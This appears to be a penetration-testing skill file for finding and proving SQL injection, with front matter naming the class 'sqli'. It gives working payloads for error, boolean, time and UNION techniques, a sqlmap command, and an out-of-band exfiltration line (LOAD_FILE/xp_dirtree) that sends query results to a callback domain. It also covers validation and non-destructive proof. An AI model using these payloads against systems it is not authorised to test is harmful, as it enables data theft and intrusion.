---
name: sqli
class: sqli
summary: Find, exploit, and prove SQL injection (error, boolean, time, union, OOB).
---
# SQL Injection

SQLi occurs when user input reaches a SQL query without safe parameterization.
Goal: prove the database interprets your input as code, then demonstrate impact
(read a row, extract a value) — non-destructively.

## Attack surface
- Every parameter that could reach a query: URL query, POST body (form/JSON),
  headers (User-Agent, X-Forwarded-For, Referer), cookies, path segments.
- ORDER BY / LIMIT / column-name contexts (not just WHERE values).
- Second-order: input stored then used in a later query (register → profile page).
- JSON/GraphQL filter operators; stored procedures; ORM `raw()` escapes.

## Recon
- Fingerprint the parameter: numeric vs string context, does a `'` change the
  response, does `1` vs `1-0` (arithmetic) behave the same (numeric injectable).
- Establish a stable baseline response for the same input class before probing.
- Fingerprint the DB engine from error text or behaviour (see the error corpus).

## Techniques (escalate)
1. **Error-based**: inject `'`, then balance `''`; a DB error on the unbalanced
   one only is strong signal. Extract via `extractvalue`/`updatexml` (MySQL),
   `CAST(... AS int)` (Postgres), error-forcing subqueries.
2. **Boolean-blind**: compare a always-true (`' OR '1'='1`) vs always-false
   (`' AND '1'='2`) condition; a stable, reproducible content divergence = injectable.
3. **Time-blind**: `1 AND SLEEP(5)` / `pg_sleep(5)` / `WAITFOR DELAY '0:0:5'`;
   confirm the delay scales with the requested seconds (rule out jitter).
4. **UNION**: find column count (ORDER BY n / UNION SELECT NULLs), then select
   `version()`, `current_user`, one row of data as proof.
5. **OOB** (no visible/blind channel): DNS/HTTP exfil to the OAST domain via a
   stacked query, `LOAD_FILE(CONCAT('\\\\',(subquery),'.oast'))`, `xp_dirtree`.
- Prefer `sqlmap` for exhaustion once a candidate is confirmed:
  `sqlmap -u '<url>' -p <param> --batch --technique=BEUST --dbms=<engine>` and
  read its output as evidence (never accept its verdict blindly).

## Proof ladder (record the level reached)
- L1 theoretical: payload accepted, no differential proven.
- L2 reflected/echoed: an injected marker/error appears in the response.
- L3 demonstrated: extracted a real value (version, a row, a username) OR a
  reproducible boolean/time oracle, OR an OOB callback fired.
- L4 critical impact: dumped sensitive data, auth bypass, or RCE via stacked/`INTO OUTFILE`.

## Validation / false positives
- A single quote returning 500 can be generic input validation, not SQLi —
  require a *differential* (balanced vs unbalanced) or a working oracle.
- WAF/generic error pages are not DB errors; match on real engine error strings.
- Time-based: confirm ≥2 delays scale and a 0-second control is fast.
- Non-destructive: read/prove only — never `DROP`, `DELETE`, `UPDATE` real data.
